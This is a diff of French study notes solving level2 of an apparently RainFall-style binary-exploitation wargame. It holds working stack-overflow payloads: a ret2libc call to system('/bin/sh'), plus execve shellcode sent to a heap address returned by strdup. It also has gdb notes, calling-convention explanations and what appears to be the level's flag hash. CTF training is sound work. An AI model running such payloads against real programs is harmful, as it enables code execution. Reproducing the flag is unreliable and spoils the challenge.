@@ -1,8 +1,8 @@
 level2:
 
 adresse system : 0xb7e6b060
-strdup : heap retourn adresse differente de 0xb
-offset 80
+strdup : heap retourne une adresse differente de 0xb
+offset 80 entre start buffer et ebp+4
 adresse return strdup : 0x804a008
 
 (gdb) b *0x0804853e
@@ -28,23 +28,14 @@ Pourquoi set ebp+8 avec une adresse bidon ?
 addr system 
 (python -c 'print "A"*76 + "\xde\xde\xde\xde" "\x60\xb0\xe6\xb7" + "\x2f\x62\x69\x6e\x2f\x73\x68\x00"') | ./level2
 
-addr gets
-0x080483c0
-(python -c 'print "A"*80 + "\xc0\x83\x04\x08"') | ./level2
-
-
-(python -c 'print "A"*80 + "\xde\xde\xde\xde" +"\x60\xb0\xe6\xb7" + "\xde\xad\xbe\xef" + "\x2f\x62\x69\x6e\x2f\x73\x68\x00" + "\xde\xde\xde\xde"') > /tmp/payload
 C'est la convention d'appel standard : l'appelant (caller) prépare le stack avec l'adresse de retour et les arguments.
 
-python -c 'print len("/bin/sh")'
 x86 (32 bits)
-
     Les paramètres sont passés sur la stack
     Convention cdecl : paramètres poussés de droite à gauche
     Registres limités (EAX, EBX, ECX, EDX, ESI, EDI)
 
 x86_64 (64 bits)
-
     Les 4 premiers arguments sont passés dans les registres
         RDI : 1er argument
         RSI : 2ème argument
@@ -102,8 +93,6 @@ C'est un mécanisme de résolution dynamique des liens qui permet :
 De charger les bibliothèques à des adresses variables
 De supporter le ASLR (Address Space Layout Randomization)
 
-(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"'; cat) | ./level2 
-// Pas mal mais n'execute pas sys
 0x0804a008
 
 shell code /bin/sh
@@ -121,5 +110,14 @@ x/[nb-bloc][format][bloc-size] [address]
     [address] : à partir d’où afficher la mémoire.
 
 Et dans l’autre ! La commande reverse-continue permet un retour au breakpoint précédent
+
+http://shell-storm.org/shellcode/files/shellcode-575.html
+
+r < <(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"')
+
+On modifie ebp+4 avec l'adresse de retour de strdup
+Pour que le flux d'execution du retour de la fonction main pointe vers notre shell code
+L'execution de code sur la heap etant active nous pouvons donc executer le execve()
+(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"'; cat) | ./level2 
 
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
